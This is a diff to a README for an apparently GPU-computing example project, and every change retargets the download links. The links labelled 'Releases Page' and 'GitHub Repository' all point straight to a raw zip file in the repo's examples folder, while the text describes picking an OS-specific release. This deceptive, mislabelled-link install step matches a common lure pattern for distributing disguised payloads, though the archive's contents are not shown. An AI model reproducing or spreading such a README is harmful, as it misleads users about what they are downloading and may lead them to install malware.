@@ -1,6 +1,6 @@
 # 🎨 webgpu-compute-exploration - Explore GPU Computing Easily
 
-[![Download Now](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip)
+[![Download Now](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ This tool provides a variety of interactive examples, including:
 
 ## 📥 Download & Install
 
-To get started with the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip).
+To get started with the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip).
 
 On the Releases page, you will find multiple versions of the application. Locate the latest version, and download the appropriate file for your system. Follow these steps:
 
-1. Open the [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip).
+1. Open the [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip).
 2. Look for the version number with the latest release.
 3. Click on the link for your operating system.
 4. Save the file to your computer.
@@ -84,7 +84,7 @@ Thanks to all the contributors and developers in the community for making GPU co
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu-compute-exploration-3.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/HoaMi121005/webgpu-compute-exploration/main/js/examples/webgpu_compute_exploration_2.0.zip)
 
 Explore the power of GPU computing today!
